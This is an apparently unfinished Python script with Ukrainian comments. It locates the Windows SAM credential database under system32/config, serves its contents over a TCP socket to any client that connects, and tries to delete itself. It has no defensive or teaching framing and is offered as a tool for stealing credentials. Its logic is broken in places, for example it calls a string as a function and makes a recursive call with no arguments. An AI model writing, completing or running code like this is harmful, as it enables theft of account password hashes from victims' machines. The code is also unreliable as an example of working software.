import os
import socket 

#Поки Змніюється HOST
global HOST 
global PORT 
HOST = "127.0.0.1"
PORT=8080
script_path = os.path.abspath(__file__)  # Отримуємо шлях до самого скрипта

search_path= "C:/Windows/system32/config"
file_name ="SAM"
def search (search_path,file_name):
    for root,dirs,files in os.walk(search_path):
        if file_name in files:
            return os.path.join(root,file_name)
    return None

found_file =search (search_path,file_name)

def dele(found_file,script_path):
    x=0
    if found_file(None):
        try:
            os.remove(script_path)
        except OSError as e:
            if (x == 1):
                exit()               
            else:
                dele()
                x+=1

    else:  
        soc(HOST,PORT,found_file)


def soc(HOST,PORT,found_file):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST,PORT))
        #ТИмчасово
        print(f"Серевер запущений на{HOST}:{PORT} ")

        #Очікування з'єднання з серевером 
        conn,addr = s.accept()
        #Timshasovo !!!!
        print("З'єднання з адресою ",addr)

        #Відкриття файл для читання і передачі 
        with open(found_file,"rb") as file:
            data=file.read()
            conn.sendall(data) #Відправляємо данні на сервер
        
        conn.close()
dele(found_file,script_path)